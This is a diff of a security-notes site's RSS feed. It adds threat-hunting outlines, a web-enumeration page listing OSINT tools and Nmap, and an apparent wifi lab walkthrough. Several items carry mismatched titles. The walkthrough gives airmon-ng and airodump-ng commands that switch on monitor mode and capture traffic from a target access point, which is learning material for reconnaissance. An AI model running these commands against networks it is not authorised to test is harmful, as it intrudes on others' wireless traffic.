     href=&#34;https://ieeexplore.ieee.org/document/9606687&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Automated Responsible Disclosure of Security Vulnerabilities&lt;/a&gt; is a  solution that leverages a distributed ledger and inteledger technologies to automate the disclosure process while offering increased security, privacy and transparency.
-&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260317233457.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
+&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260317233457.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
 The ARD solution presented in the above mentioned paper tackles all the problems currently present in the Responsible disclosure approaches and possibly be a solution in the future.&lt;/p&gt;
 &lt;h5&gt;3.2.2 Cyber Threat Reporting&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;322-cyber-threat-reporting&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#322-cyber-threat-reporting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;p&gt;The creation of structured and actionable reports that communicate threat insights (e.g., actors, TTPs, risks) tailored to different audiences such as executives, analysts, or SOC teams.&lt;/p&gt;
@@ -5098,17 +5343,465 @@ The ARD solution presented in the above mentioned paper tackles all the problems
 &lt;li&gt;&lt;a
     href=&#34;https://center-for-threat-informed-defense.github.io/cti-blueprints/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CTI Blueprint&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260319003014.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260319003014.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[04] Hunting with Data</title>
+      <link>http://localhost:1313/docs/01_methodology/threat-hunting/04-hunting-with-data/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/01_methodology/threat-hunting/04-hunting-with-data/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;March 19, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;4.1 Data types&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;41-data-types&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#41-data-types&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.2 Network Data&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;42-network-data&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#42-network-data&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.3 Endpoint /Host Data&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;43-endpoint-host-data&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#43-endpoint-host-data&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.4 Authentication &amp;amp; Identity Data&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;44-authentication--identity-data&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#44-authentication--identity-data&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.5 File and Storage Data&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;45-file-and-storage-data&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#45-file-and-storage-data&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.6 Email Data&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;46-email-data&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#46-email-data&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.7 Cloud &amp;amp; SaaS Logs&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;47-cloud--saas-logs&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#47-cloud--saas-logs&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.8 Application Logs&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;48-application-logs&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#48-application-logs&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.9 Security Tool Telemetry&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;49-security-tool-telemetry&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#49-security-tool-telemetry&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.10 Threat Intelligence Data&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;410-threat-intelligence-data&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#410-threat-intelligence-data&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h4&gt;4.11 Memory Artifacts&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;411-memory-artifacts&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#411-memory-artifacts&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;
+      </description>
+    </item>
+    
+    <item>
+      <title>[05 Threat Hunting in Cloud</title>
+      <link>http://localhost:1313/docs/01_methodology/threat-hunting/05-threat-hunting-in-cloud/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/01_methodology/threat-hunting/05-threat-hunting-in-cloud/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;March 19, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h1&gt;🚧 Page Under Construction&lt;/h1&gt;&lt;p&gt;Sorry, this page is currently under construction.&lt;/p&gt;
+&lt;p&gt;Please check back later.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;If you believe this is an error, feel free to contact the site administrator.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[06] Psychology of Trust Boundaries</title>
+      <link>http://localhost:1313/docs/01_methodology/threat-hunting/06-psychology-of-trust-boundary/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/01_methodology/threat-hunting/06-psychology-of-trust-boundary/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;March 19, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h1&gt;🚧 Page Under Construction&lt;/h1&gt;&lt;p&gt;Sorry, this page is currently under construction.&lt;/p&gt;
+&lt;p&gt;Please check back later.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;If you believe this is an error, feel free to contact the site administrator.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[06] Threat Hunting in Cloud</title>
+      <link>http://localhost:1313/docs/02_platforms/web/web-application-enumeration/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/02_platforms/web/web-application-enumeration/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;March 19, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Passive Information gathering&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;passive-information-gathering&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#passive-information-gathering&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;As part of passive information gathering, we can use the OSINT tools to gather information from a web application.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div
+  data-alert=&#34;note&#34; class=&#34;hextra-alert&#34;
+&gt;
+  &lt;p class=&#34;hextra-alert-title&#34;&gt;&lt;svg height=16px class=&#34;hextra-alert-icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z&#34;/&gt;&lt;/svg&gt;&lt;span class=&#34;hextra-alert-title-text&#34;&gt;OSINT&lt;/span&gt;
+  &lt;/p&gt;
+
+  &lt;div class=&#34;hextra-alert-content&#34;&gt;&lt;p&gt;&lt;a
+    href=&#34;https://www.crowdstrike.com/en-us/cybersecurity-101/threat-intelligence/open-source-intelligence-osint/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Crowdstrike OSINT Article&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Other interesting resources
+&lt;a
+    href=&#34;https://www.akamai.com/glossary/what-is-a-cdn&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Content Delivery Network&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Passive Information Gathering Tools&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;passive-information-gathering-tools&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#passive-information-gathering-tools&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Domain Information
+&lt;ul&gt;
+&lt;li&gt;&lt;a
+    href=&#34;http://localhost:1313/docs/06_tools/06.1_web/Whois/&#34;&gt;Whois&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Lookup tool&lt;/li&gt;
+&lt;li&gt;ICANN&amp;rsquo;s website&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Subdomain Identification
+&lt;ul&gt;
+&lt;li&gt;DNSDumpster&lt;/li&gt;
+&lt;li&gt;Certificate transparency&lt;/li&gt;
+&lt;li&gt;crt.sh&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Additional Insights
+&lt;ul&gt;
+&lt;li&gt;Shodan&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Service Discovery&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;service-discovery&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#service-discovery&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Apart from the above mentioned, there are methods to discover running services.&lt;/li&gt;
+&lt;li&gt;The most common toolkit used for that is &lt;code&gt;Nmap&lt;/code&gt;, that is used to discover open ports and services on a host or across entire networks.
+&lt;img src=&#34;http://localhost:1313/docs/02_platforms/web/assets/Pasted_image_20260320153345.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[06] Threat Hunting in Cloud</title>
+      <link>http://localhost:1313/docs/02_platforms/wifi/01-recon/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/02_platforms/wifi/01-recon/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;March 19, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;01. What is the channel that the wifi-global Access Point is currently using?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;01-what-is-the-channel-that-the-wifi-global-access-point-is-currently-using&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#01-what-is-the-channel-that-the-wifi-global-access-point-is-currently-using&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Setup the wifi adapter in monitor mode and verify the setup&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ airmon-ng check &lt;span class=&#34;nb&#34;&gt;kill&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ airmon-ng start wlan0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ airmon-ng --verbose&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Start &lt;code&gt;airodump-ng&lt;/code&gt; and look for the results&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;We can also see the output capture files are saved for the further analysis.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;02. What is the MAC of the wifi-IT client?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;02-what-is-the-mac-of-the-wifi-it-client&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#02-what-is-the-mac-of-the-wifi-it-client&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;From the previous output we can see that the BSSID of the client wifi-IT is &lt;code&gt;F0:9F:C2:1A:CA:25&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Using this information we can identify the MAC of the essid &lt;code&gt;wifi-IT&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;airodump-ng wlan0mon --essid wifi-IT --bssid F0:9F:C2:1A:CA:25 -c &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; --manufacturer --wps&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4&gt;03. What is the probe of 78:C1:A7:BF:72:46 ?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;03-what-is-the-probe-of-78c1a7bf7246-&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#03-what-is-the-probe-of-78c1a7bf7246-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;We can run &lt;code&gt;airodump-ng&lt;/code&gt; again to check the probe of provided address.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
